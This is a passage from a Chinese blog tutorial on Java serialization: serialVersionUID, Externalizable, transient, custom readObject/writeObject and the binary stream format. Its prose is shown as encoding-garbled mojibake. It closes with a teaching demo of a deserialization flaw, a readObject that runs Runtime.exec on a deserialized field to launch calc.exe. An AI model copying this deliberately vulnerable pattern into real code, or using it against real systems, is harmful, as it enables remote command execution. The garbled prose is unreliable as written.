æ³¨é‡Šç­‰ç­‰)ï¼Œå°±ç®—å†ç¼–è¯‘å¤šæ¬¡ï¼ŒserialVersionUIDä¹Ÿä¸ä¼šå˜åŒ–çš„ã€‚</p><p><strong>æ˜¾å¼åœ°å®šä¹‰serialVersionUIDæœ‰ä¸¤ç§ç”¨é€”ï¼š</strong></p><p>1ã€ åœ¨æŸäº›åœºåˆï¼Œå¸Œæœ›ç±»çš„ä¸åŒç‰ˆæœ¬å¯¹åºåˆ—åŒ–å…¼å®¹ï¼Œå› æ­¤éœ€è¦ç¡®ä¿ç±»çš„ä¸åŒç‰ˆæœ¬å…·æœ‰ç›¸åŒçš„serialVersionUIDï¼›</p><p>2ã€ åœ¨æŸäº›åœºåˆï¼Œä¸å¸Œæœ›ç±»çš„ä¸åŒç‰ˆæœ¬å¯¹åºåˆ—åŒ–å…¼å®¹ï¼Œå› æ­¤éœ€è¦ç¡®ä¿ç±»çš„ä¸åŒç‰ˆæœ¬å…·æœ‰ä¸åŒçš„serialVersionUIDã€‚</p><h2 id="åºåˆ—åŒ–çš„æ§åˆ¶"><a href="#åºåˆ—åŒ–çš„æ§åˆ¶" class="headerlink" title="åºåˆ—åŒ–çš„æ§åˆ¶"></a>åºåˆ—åŒ–çš„æ§åˆ¶</h2><p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯èƒ½éœ€è¦å¯¹åºåˆ—åŒ–çš„è¿‡ç¨‹è¿›è¡Œæ§åˆ¶ï¼Œæ¯”å¦‚è¯´ä¸éœ€è¦å“ªäº›éƒ¨åˆ†è¢«ååºåˆ—åŒ–ç­‰ï¼Œè¿™æ—¶å¯é€šè¿‡Externalizableæ¥å£æ›¿ä»£Serializableæ¥å£æ¥å®ç°å¯¹åºåˆ—åŒ–è¿‡ç¨‹çš„æ§åˆ¶ã€‚</p><p><strong>1ã€Externalizable</strong></p><p>Externalizableæ¥å£ç»§æ‰¿äº†Serializableæ¥å£ï¼ŒåŒæ—¶æ·»åŠ äº†ä¸¤ä¸ªæ–¹æ³•å³writeExternal()å’ŒreadExternal()ï¼Œä¸¤è€…ä¼šåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œä»¥ä¾¿äºæ‰§è¡Œä¸€äº›ç‰¹æ®Šæ“ä½œæ¥å®ç°è¿‡ç¨‹æ§åˆ¶ã€‚</p><p><strong>2ã€transientå…³é”®å­—</strong></p><p>å½“æˆ‘ä»¬å¯¹åºåˆ—åŒ–è¿›è¡Œæ§åˆ¶æ—¶ï¼Œå¯èƒ½æœ‰äº›ç‰¹æ®Šå­å¯¹è±¡ä¸æƒ³è®©Javaçš„åºåˆ—åŒ–æœºåˆ¶è‡ªåŠ¨ä¿å­˜å’Œæ¢å¤ï¼Œæ¯”å¦‚è¯´å­å¯¹è±¡è¡¨ç¤ºçš„æ˜¯æ•æ„Ÿä¿¡æ¯ã€‚å³ä½¿å¯¹è±¡ä¸­çš„è¿™äº›ä¿¡æ¯æ˜¯privateå±æ€§ï¼Œä½†ç»è¿‡åºåˆ—åŒ–å¤„ç†åäººä»¬å°±å¯ä»¥é€šè¿‡è¯»å–æ–‡ä»¶æˆ–æ‹¦æˆªæ•°æ®æŠ¥æ–‡æ¥éæ³•è·å–è¯¥ä¿¡æ¯ã€‚</p><p>è¿™æ—¶å­˜åœ¨ä¸¤ä¸ªæ–¹æ³•ã€‚ä¸€æ˜¯é€šè¿‡å°†ç±»å®ç°ä¸ºå‰é¢çš„Externalizableï¼Œè¿™æ—¶æ— ä»»ä½•ä¸œè¥¿å¯ä»¥è‡ªåŠ¨åºåˆ—åŒ–ï¼Œå¹¶ä¸”å¯åœ¨writeExternal()å†…éƒ¨åªå¯¹æ‰€éœ€éƒ¨åˆ†è¿›è¡Œæ˜¾å¼çš„åºåˆ—åŒ–ï¼›äºŒæ˜¯å½“æˆ‘ä»¬æ­£åœ¨æ“ä½œçš„æ˜¯ä¸€ä¸ªSerializableå¯¹è±¡ï¼Œåˆ™æ‰€æœ‰åºåˆ—åŒ–æ“ä½œä¼šè‡ªåŠ¨æ‰§è¡Œï¼Œè¿™æ—¶å°±å¯åº”ç”¨åˆ°transientï¼ˆç¬æ—¶ï¼‰å…³é”®å­—æ¥é€ä¸ªå­—æ®µåœ°å…³é—­åºåˆ—åŒ–ï¼Œå³è¯´æ˜æŒ‡å®šå­—æ®µå†…å®¹åœ¨åºåˆ—åŒ–ä¸­æ˜¯ä¸éœ€è¦ä¿å­˜æˆ–æ¢å¤æ“ä½œçš„ã€‚</p><p>ç”±äºExternalizableå¯¹è±¡åœ¨é»˜è®¤æƒ…å†µä¸‹ä¸ä¿å­˜å®ƒä»¬çš„ä»»ä½•å­—æ®µï¼Œæ‰€ä»¥<strong>transientå…³é”®å­—åªèƒ½å’ŒSerializableå¯¹è±¡ä¸€èµ·ä½¿ç”¨</strong>ã€‚</p><p><strong>3ã€è‡ªå·±å®ç°Serializable</strong></p><p>è‹¥éååˆ†åšå®šåœ°ä½¿ç”¨Externalizableæ¥å£ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥è‡ªå·±å®ç°Serializableæ¥å£ï¼Œå¹¶æ·»åŠ writeObject()å’ŒreadObject()æ–¹æ³•ï¼Œä¸€æ—¦å¯¹è±¡è¢«åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿˜åŸï¼Œå°±ä¼šè‡ªåŠ¨åœ°åˆ†åˆ«è°ƒç”¨è¿™ä¸¤ä¸ªæ–¹æ³•ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é‡Œè¯´çš„æ˜¯â€œæ·»åŠ â€è€Œéâ€œè¦†ç›–â€æˆ–â€œå®ç°â€ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œ<strong>åªè¦æˆ‘ä»¬æä¾›äº†è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œç¨‹åºå°±ä¼šä½¿ç”¨è¿™ä¸¤ä¸ªæ–¹æ³•è€Œéé»˜è®¤çš„åºåˆ—åŒ–æœºåˆ¶ã€‚</strong></p><p>è¿™äº›æ–¹æ³•å¿…é¡»å…·æœ‰å‡†ç¡®çš„æ–¹æ³•ç‰¹å¾ç­¾åï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream stream)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream stream)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œè¿™äº›æ–¹æ³•è¢«å®šä¹‰æˆäº†privateã€‚</p><p>åœ¨è°ƒç”¨ObjectOutputStream.writeObject()æ—¶ï¼Œä¼šæ£€æŸ¥æ‰€ä¼ é€’çš„Serializableå¯¹è±¡ï¼Œçœ‹çœ‹æ˜¯å¦å®ç°äº†è‡ªå·±çš„writeObject()ï¼Œè‹¥å®ç°äº†ï¼Œåˆ™è·³è¿‡æ­£å¸¸çš„åºåˆ—åŒ–è¿‡ç¨‹å¹¶è°ƒç”¨è‡ªå·±å®ç°çš„writeObject()ã€‚readObject()æ–¹æ³•çš„æƒ…å½¢ç±»ä¼¼ã€‚</p><h2 id="åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ ¼å¼"><a href="#åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ ¼å¼" class="headerlink" title="åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ ¼å¼"></a>åºåˆ—åŒ–çš„äºŒè¿›åˆ¶æ ¼å¼</h2><p>çœ‹å›åˆšæ‰ç”¨WinHexæ‰“å¼€çš„åºåˆ—åŒ–Demoç”Ÿæˆçš„user.seræ–‡ä»¶ï¼š</p><p><img src="/2019/02/03/Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶/1.png" alt="åºåˆ—åŒ–demo"></p><p>AC EDï¼šSTREAM_MAGICï¼Œå£°æ˜ä½¿ç”¨äº†åºåˆ—åŒ–åè®®ï¼Œä»è¿™é‡Œå¯ä»¥åˆ¤æ–­ä¿å­˜çš„å†…å®¹æ˜¯å¦ä¸ºåºåˆ—åŒ–æ•°æ®ã€‚</p><p>00 05ï¼šSTREAM_VERSIONï¼Œåºåˆ—åŒ–åè®®ç‰ˆæœ¬ã€‚</p><p>0x73ï¼šTC_OBJECTï¼Œå£°æ˜è¿™æ˜¯ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚</p><p>0x72ï¼šTC_CLASSDESCï¼Œå£°æ˜è¿™é‡Œå¼€å§‹ä¸€ä¸ªæ–°Classã€‚</p><p>00 04ï¼šClassåå­—çš„é•¿åº¦ï¼Œè¿™é‡ŒClassåä¸ºUserï¼Œé•¿åº¦ä¸º4ã€‚</p><p>55 73 65 72ï¼šç±»åç§°Userã€‚</p><p>64 D4 C4 D2 26 CA C4 8Dï¼šSerialVersionUIDï¼Œåºåˆ—åŒ–IDï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šï¼Œåˆ™ä¼šç”±ç®—æ³•éšæœºç”Ÿæˆä¸€ä¸ª8byteçš„IDã€‚</p><p>0x02ï¼šæ ‡è®°å·ï¼Œè¯¥å€¼å£°æ˜è¯¥å¯¹è±¡æ”¯æŒåºåˆ—åŒ–ã€‚</p><p>00 02ï¼šè¯¥ç±»æ‰€åŒ…å«çš„åŸŸä¸ªæ•°ã€‚</p><p>0x49ï¼šåŸŸç±»å‹ï¼Œ49 ä»£è¡¨â€Iâ€ï¼Œä¹Ÿå°±æ˜¯Intã€‚</p><p>00 06ï¼šåŸŸåå­—çš„é•¿åº¦ï¼Œè¯¥åŸŸåä¸ºnumberã€é•¿åº¦ä¸º6ã€‚</p><p>6E 75 6D 62 65 72ï¼šåŸŸåå­—æè¿°ï¼Œè¿™é‡Œä¸ºnumberã€‚</p><p>0x4Cï¼šåŸŸçš„ç±»å‹ï¼Œ4Cä»£è¡¨Stringã€‚</p><p>00 04ï¼šåŸŸåå­—çš„é•¿åº¦ï¼Œè¯¥åŸŸåä¸ºnameã€é•¿åº¦ä¸º4ã€‚</p><p>6E 61 6D 65ï¼šåŸŸåå­—æè¿°ï¼Œè¿™é‡Œä¸ºnameã€‚</p><p>0x74ï¼šTC_STRINGï¼Œä»£è¡¨ä¸€ä¸ªnew Stringï¼Œç”¨Stringæ¥å¼•ç”¨å¯¹è±¡ã€‚</p><p>00 12ï¼šè¯¥Stringé•¿åº¦ï¼Œè¿™é‡ŒStringä¸ºâ€œLjava/lang/String;â€ã€é•¿åº¦ä¸º0x12.</p><p>4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3Bï¼šJVMçš„æ ‡å‡†å¯¹è±¡ç­¾åè¡¨ç¤ºæ³•ï¼Œè¿™é‡Œæ˜¯æŒ‡Stringä¸ºâ€œLjava/lang/String;â€ã€‚</p><p>0x78ï¼šTC_ENDBLOCKDATAï¼Œå¯¹è±¡æ•°æ®å—ç»“æŸçš„æ ‡å¿—ã€‚</p><p>0x70ï¼šTC_NULLï¼Œè¯´æ˜æ²¡æœ‰å…¶ä»–è¶…ç±»çš„æ ‡å¿—ã€‚</p><p>00 00 02 9Aï¼š<del>è¿™ä¸ªæš‚æ—¶ä¸çŸ¥é“ï¼Œå„ä½å¤§ä½¬çŸ¥é“çš„éº»çƒ¦æŒ‡ç‚¹ä¸€ä¸‹ ï¼š)</del></p><p>0x74ï¼šTC_STRINGï¼Œä»£è¡¨ä¸€ä¸ªnew Stringï¼Œç”¨Stringæ¥å¼•ç”¨å¯¹è±¡ã€‚</p><p>00 07ï¼šåŸŸåå­—çš„é•¿åº¦ï¼Œè¯¥åŸŸåä¸ºMi1k7eaã€é•¿åº¦ä¸º7ã€‚</p><p>4D 69 31 6B 37 65 61ï¼šåŸŸåå­—æè¿°ï¼Œè¿™é‡Œä¸ºâ€œMi1k7eaâ€ã€‚</p><h2 id="è‡ªå®šä¹‰å®ç°åºåˆ—åŒ–"><a href="#è‡ªå®šä¹‰å®ç°åºåˆ—åŒ–" class="headerlink" title="è‡ªå®šä¹‰å®ç°åºåˆ—åŒ–"></a>è‡ªå®šä¹‰å®ç°åºåˆ—åŒ–</h2><p>å¦‚å‰é¢åºåˆ—åŒ–çš„æ§åˆ¶ä¸­çš„è‡ªå·±å®ç°Serializableæ‰€è¯´ï¼Œå¯ä»¥æ·»åŠ writeObject()å’ŒreadObject()è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå®ƒä»¬å¹¶ä¸å±äºä»»ä½•çš„ç±»å’Œæ¥å£ï¼Œåªè¦åœ¨è¦åºåˆ—åŒ–çš„ç±»ä¸­æä¾›è¿™ä¸¤ä¸ªæ–¹æ³•ï¼Œå°±ä¼šåœ¨åºåˆ—åŒ–æœºåˆ¶ä¸­è‡ªåŠ¨è¢«è°ƒç”¨ã€‚</p><p>è‡ªå®šä¹‰å®ç°çš„å¥½å¤„æ˜¯ï¼šç¨‹åºå‘˜å¯ä»¥æ›´åŠ ç²¾ç»†æˆ–è€…è¯´å¯ä»¥å»å®šåˆ¶è‡ªå·±æƒ³è¦å®ç°çš„åºåˆ—åŒ–ï¼Œå¦‚ä¸‹é¢ä¾‹å­ä¸­å°†nameå’Œaddresså˜é‡å€¼åè½¬ã€‚åˆ©ç”¨è¿™ç§ç‰¹ç‚¹ï¼Œå¯ä»¥åœ¨åºåˆ—åŒ–è¿‡ç¨‹ä¸­å¯¹ä¸€äº›æ•æ„Ÿä¿¡æ¯åšç‰¹æ®Šçš„å¤„ç†ã€‚</p><p>User.classï¼šæ·»åŠ äº†privateå…³é”®å­—çš„writeObject()å’ŒreadObject()ä¸¤ä¸ªæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Write Object."</span>);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(name).reverse());</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(address).reverse());</span><br><span class="line">        out.writeInt(number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Read Object."</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.address = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.number = in.readInt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.classï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.name = <span class="string">"Mi1k7ea"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            user = (User)ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Name: "</span> + user.name + <span class="string">"\nAddress: "</span> + user.address + <span class="string">"\nNumber: "</span> + user.number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        serialize_test();</span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡ŒæŸ¥çœ‹ï¼Œç¡®å®æ˜¯ç»è¿‡è‡ªå·±ç¼–å†™çš„writeObject()å’ŒreadObject()ä¸¤ä¸ªæ–¹æ³•æ¥å®ç°åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œçš„ï¼š</p><p><img src="/2019/02/03/Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶/4.png" alt="è‡ªå®šä¹‰åºåˆ—åŒ–demo"></p><p><strong>whatâ€™s moreï¼â€”â€”ååºåˆ—åŒ–æ¼æ´ç‚¹</strong></p><p>Javaååºåˆ—åŒ–æ¼æ´ç‚¹é€šå¸¸åœ¨äºè‡ªå®šä¹‰å®ç°çš„readObject()æ–¹æ³•çš„ä»£ç é€»è¾‘å­˜åœ¨ç¼ºé™·ï¼Œå¯¼è‡´å¯èƒ½ä¼šè§¦å‘ååºåˆ—åŒ–æ¼æ´ã€‚</p><p>å…¶å®è¿™å’ŒPHPååºåˆ—åŒ–æ¼æ´åŸç†å·®ä¸å¤šï¼ŒPHPä¸­æ˜¯é­”æ³•å‡½æ•°è‹¥å­˜åœ¨ç¼ºé™·ä»£ç åˆ™å¯èƒ½ä¼šå­˜åœ¨ååºåˆ—åŒ–æ¼æ´é£é™©ï¼Œè¿™ç±»ä¼¼äºJavaä¸­è‡ªå®šä¹‰å®ç°çš„readObject()å‡½æ•°ã€‚</p><p>ä¸‹é¢çš„ä¾‹å­åªåœ¨å‰é¢çš„ä¾‹å­ä¸­æ·»åŠ ifè¯­å¥ä¸­çš„Runtime.getRuntime().exec()ï¼š</p><p>User.classï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Write Object."</span>);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(name).reverse());</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(address).reverse());</span><br><span class="line">        out.writeInt(number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Read Object."</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.address = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.number = in.readInt();</span><br><span class="line">        <span class="comment">//åŠ äº†ä¸ªåˆ¤æ–­ï¼Œå½“æ•°å­—ä¸º666æ—¶ï¼Œè¿›å…¥ç¼ºé™·ä»£ç é€»è¾‘å—</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.number == <span class="number">666</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="comment">//å°†nameå­—æ®µå€¼ä¿®æ”¹ä¸ºcalcå‘½ä»¤</span></span><br><span class="line">        user.name = <span class="string">"calc.exe"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        <span class="comment">//å°†numberå€¼è®¾ç½®ä¸ºæ»¡è¶³ifåˆ¤æ–­æ¡ä»¶çš„666å€¼</span></span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]Userå¯¹è±¡å·²ç»åºåˆ—åŒ–ä¿å­˜åˆ°user.seræ–‡ä»¶ä¸­"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            user = (User)ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Name: "</span> + user.name + <span class="string">"\nAddress: "</span> + user.address + <span class="string">"\nNumber: "</span> + user.number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        serialize_test();</span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç ï¼ŒæŸ¥çœ‹åˆ°readObject()ä¸­çš„ä¸å®‰å…¨ä»£ç å—ä¸­æ‰§è¡Œäº†å‘½ä»¤ï¼š</p><p><img src="/2019/02/03/Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–æœºåˆ¶/5.png" alt="è‡ªå®šä¹‰åºåˆ—åŒ–demo"></p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><p><a href="https://www.cnblogs.com/dongguacai/p/5721056.html" target="_blank" rel="noopener">æ·±å…¥ç†è§£JAVA I/Oç³»åˆ—äº”ï¼šå¯¹è±¡åºåˆ—åŒ–</a></p><p><a href="http://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">Java åºåˆ—åŒ–</a></p><p><a href="https://www.cnblogs.com/duanxz/p/3511695.html" target="_blank" rel="noopener">javaç±»ä¸­serialversionuid 